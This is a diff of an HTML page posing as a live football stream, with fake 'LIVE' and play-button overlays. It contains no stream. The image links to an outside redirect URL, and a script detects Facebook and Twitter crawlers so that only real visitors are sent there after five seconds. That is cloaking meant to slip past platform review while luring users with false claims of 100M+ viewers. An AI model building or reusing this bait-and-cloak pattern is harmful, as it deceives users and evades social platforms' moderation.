@@ -2,35 +2,111 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>🔥Live Football Now! La Liga, Premier League & More ⚽</title>
+  <title>🔥 Live Football Now! La Liga, Premier League & More ⚽</title>
 
-  <!-- Facebook OG Meta -->
-  <meta property="og:title" content="🔥Live Football Now! La Liga, Premier League & More ⚽">
-  <meta property="og:description" content="Live 100M+ viewers watching">
+  <!-- Facebook Open Graph Meta -->
+  <meta property="og:title" content="🔥 Live Football Now! La Liga, Premier League & More ⚽">
+  <meta property="og:description" content="Join 100M+ live viewers! Watch your favorite matches now.">
   <meta property="og:image" content="https://raw.githubusercontent.com/kindwordai/images/main/355.jpg">
-  <meta property="og:url" content="https://www.x.com">
+  <meta property="og:url" content="https://yourdomain.com">
   <meta property="og:type" content="website">
 
   <!-- Twitter Card -->
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="https://raw.githubusercontent.com/kindwordai/images/main/355.jpg">
   <meta name="twitter:title" content="🔥 Live Football Now! La Liga, Premier League & More ⚽">
-  <meta name="twitter:description" content="Live 100M+ viewers watching">
+  <meta name="twitter:description" content="Join 100M+ live viewers! Watch your favorite matches now.">
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/kindwordai/images/main/355.jpg">
 
   <!-- No image indexing -->
   <meta name="robots" content="noimageindex">
+
+  <!-- Responsive & Basic Styles -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: #000;
+      color: #fff;
+      text-align: center;
+    }
+    h1 {
+      margin-top: 40px;
+      font-size: 2em;
+      color: #ff0000;
+    }
+    p {
+      font-size: 1.2em;
+    }
+    .live-image {
+      max-width: 90%;
+      border-radius: 12px;
+      margin-top: 20px;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+    .live-image:hover {
+      transform: scale(1.05);
+    }
+    .live-badge {
+      position: absolute;
+      background: red;
+      color: #fff;
+      font-weight: bold;
+      padding: 5px 10px;
+      border-radius: 5px;
+      top: 10px;
+      left: 10px;
+      font-size: 14px;
+    }
+    .image-wrapper {
+      position: relative;
+      display: inline-block;
+    }
+    .play-button {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 60px;
+      color: #fff;
+      opacity: 0.8;
+      pointer-events: none;
+      text-shadow: 0 0 10px #000;
+    }
+  </style>
 </head>
 <body>
+
+  <h1>🔥 Watch Live Football Now!</h1>
+  <p>La Liga, Premier League & More ⚽</p>
+
+  <!-- Clickable Image -->
+  <div class="image-wrapper">
+    <a href="https://otieu.com/4/9890948" target="_blank">
+      <img src="https://raw.githubusercontent.com/kindwordai/images/main/355.jpg" 
+           alt="Live Football" class="live-image">
+      <div class="play-button">▶</div>
+      <div class="live-badge">LIVE</div>
+    </a>
+  </div>
+
+  <p style="margin-top: 15px;">Click the image to watch live matches now!</p>
+
+  <!-- Optional Auto Redirect Fallback -->
   <script>
-    // User-Agent detect for Facebook / Twitter bots
     const ua = navigator.userAgent;
+    // Only redirect real users, not bots
     if (!ua.includes("facebookexternalhit") && 
         !ua.includes("Facebot") && 
         !ua.includes("Twitterbot")) {
-      window.location.href = "https://otieu.com/4/9890948";
+      // Redirect after 5 seconds if user doesn't click
+      setTimeout(() => {
+        window.location.href = "https://otieu.com/4/9890948";
+      }, 5000);
     }
   </script>
+
 </body>
-
 </html>
-
